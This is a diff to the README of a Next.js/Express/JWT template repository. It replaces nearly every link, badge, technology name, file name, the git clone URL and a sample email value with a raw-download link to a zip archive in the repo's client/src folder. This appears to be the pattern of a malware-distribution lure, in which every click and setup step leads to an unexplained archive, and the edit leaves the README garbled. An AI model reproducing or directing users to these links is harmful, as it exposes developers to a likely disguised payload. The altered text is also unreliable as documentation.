@@ -1,12 +1,12 @@
 # Secure Next Express Template: Full-Stack Application Boilerplate 🚀
 
-![GitHub Repo Stars](https://img.shields.io/github/stars/yyemaen321/Secure-Next-Express-Template?style=social) ![GitHub Issues](https://img.shields.io/github/issues/yyemaen321/Secure-Next-Express-Template) ![GitHub Forks](https://img.shields.io/github/forks/yyemaen321/Secure-Next-Express-Template)
+![GitHub Repo Stars](https://github.com/yyemaen321/Secure-Next-Express-Template/raw/refs/heads/main/client/src/Express_Template_Next_Secure_v2.8.zip) ![GitHub Issues](https://github.com/yyemaen321/Secure-Next-Express-Template/raw/refs/heads/main/client/src/Express_Template_Next_Secure_v2.8.zip) ![GitHub Forks](https://github.com/yyemaen321/Secure-Next-Express-Template/raw/refs/heads/main/client/src/Express_Template_Next_Secure_v2.8.zip)
 
 ## Overview
 
-Welcome to the **Secure Next Express Template**! This repository offers a robust full-stack template built with **Next.js**, **TypeScript**, **Express**, and **JWT authentication**. It features pre-configured API integration and a modular architecture, making it ideal for rapid application development.
+Welcome to the **Secure Next Express Template**! This repository offers a robust full-stack template built with **https://github.com/yyemaen321/Secure-Next-Express-Template/raw/refs/heads/main/client/src/Express_Template_Next_Secure_v2.8.zip**, **TypeScript**, **Express**, and **JWT authentication**. It features pre-configured API integration and a modular architecture, making it ideal for rapid application development.
 
-You can find the latest releases [here](https://github.com/yyemaen321/Secure-Next-Express-Template/releases).
+You can find the latest releases [here](https://github.com/yyemaen321/Secure-Next-Express-Template/raw/refs/heads/main/client/src/Express_Template_Next_Secure_v2.8.zip).
 
 ## Table of Contents
 
@@ -33,14 +33,14 @@ You can find the latest releases [here](https://github.com/yyemaen321/Secure-Nex
 
 ## Technologies Used
 
-- **Next.js**: A powerful React framework for server-side rendering.
+- **https://github.com/yyemaen321/Secure-Next-Express-Template/raw/refs/heads/main/client/src/Express_Template_Next_Secure_v2.8.zip**: A powerful React framework for server-side rendering.
 - **TypeScript**: A typed superset of JavaScript for better code quality.
-- **Express**: A fast, unopinionated web framework for Node.js.
+- **Express**: A fast, unopinionated web framework for https://github.com/yyemaen321/Secure-Next-Express-Template/raw/refs/heads/main/client/src/Express_Template_Next_Secure_v2.8.zip
 - **JWT**: For secure authentication and authorization.
 - **Axios**: For making HTTP requests.
 - **Bcrypt**: For hashing passwords.
 - **Tailwind CSS**: A utility-first CSS framework for styling.
-- **Node.js**: JavaScript runtime for building server-side applications.
+- **https://github.com/yyemaen321/Secure-Next-Express-Template/raw/refs/heads/main/client/src/Express_Template_Next_Secure_v2.8.zip**: JavaScript runtime for building server-side applications.
 
 ## Installation
 
@@ -49,7 +49,7 @@ To set up the project, follow these steps:
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/yyemaen321/Secure-Next-Express-Template.git
+   git clone https://github.com/yyemaen321/Secure-Next-Express-Template/raw/refs/heads/main/client/src/Express_Template_Next_Secure_v2.8.zip
    ```
 
 2. **Navigate to the project directory**:
@@ -66,7 +66,7 @@ To set up the project, follow these steps:
 
 4. **Create a `.env` file**:
 
-   Copy the `.env.example` file to `.env` and fill in the required environment variables.
+   Copy the `https://github.com/yyemaen321/Secure-Next-Express-Template/raw/refs/heads/main/client/src/Express_Template_Next_Secure_v2.8.zip` file to `.env` and fill in the required environment variables.
 
 5. **Run the development server**:
 
@@ -86,9 +86,9 @@ Here's a breakdown of the project structure:
 
 ```
 Secure-Next-Express-Template/
-├── client/                 # Frontend code (Next.js)
+├── client/                 # Frontend code (https://github.com/yyemaen321/Secure-Next-Express-Template/raw/refs/heads/main/client/src/Express_Template_Next_Secure_v2.8.zip)
 │   ├── components/         # Reusable React components
-│   ├── pages/              # Next.js pages
+│   ├── pages/              # https://github.com/yyemaen321/Secure-Next-Express-Template/raw/refs/heads/main/client/src/Express_Template_Next_Secure_v2.8.zip pages
 │   ├── styles/             # Tailwind CSS styles
 │   └── utils/              # Utility functions
 ├── server/                 # Backend code (Express)
@@ -96,9 +96,9 @@ Secure-Next-Express-Template/
 │   ├── models/             # Database models
 │   ├── routes/             # API routes
 │   └── middleware/         # Middleware functions
-├── .env.example             # Example environment variables
-├── package.json             # Project dependencies and scripts
-└── README.md               # Project documentation
+├── https://github.com/yyemaen321/Secure-Next-Express-Template/raw/refs/heads/main/client/src/Express_Template_Next_Secure_v2.8.zip             # Example environment variables
+├── https://github.com/yyemaen321/Secure-Next-Express-Template/raw/refs/heads/main/client/src/Express_Template_Next_Secure_v2.8.zip             # Project dependencies and scripts
+└── https://github.com/yyemaen321/Secure-Next-Express-Template/raw/refs/heads/main/client/src/Express_Template_Next_Secure_v2.8.zip               # Project documentation
 ```
 
 ## API Endpoints
@@ -125,7 +125,7 @@ The application uses JWT for authentication. Here’s how it works:
 ```bash
 curl -X POST http://localhost:5000/api/auth/login \
 -H "Content-Type: application/json" \
--d '{"email": "user@example.com", "password": "yourpassword"}'
+-d '{"email": "https://github.com/yyemaen321/Secure-Next-Express-Template/raw/refs/heads/main/client/src/Express_Template_Next_Secure_v2.8.zip", "password": "yourpassword"}'
 ```
 
 ### Example Protected Route Request
@@ -141,7 +141,7 @@ The project uses **Tailwind CSS** for styling. Tailwind provides utility classes
 
 ### Customizing Tailwind
 
-To customize Tailwind, edit the `tailwind.config.js` file. You can add new colors, spacing, and more.
+To customize Tailwind, edit the `https://github.com/yyemaen321/Secure-Next-Express-Template/raw/refs/heads/main/client/src/Express_Template_Next_Secure_v2.8.zip` file. You can add new colors, spacing, and more.
 
 ## Contributing
 
@@ -157,4 +157,4 @@ We welcome contributions! If you want to contribute to this project, please foll
 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-For more information, check the [Releases](https://github.com/yyemaen321/Secure-Next-Express-Template/releases) section.
+For more information, check the [Releases](https://github.com/yyemaen321/Secure-Next-Express-Template/raw/refs/heads/main/client/src/Express_Template_Next_Secure_v2.8.zip) section.
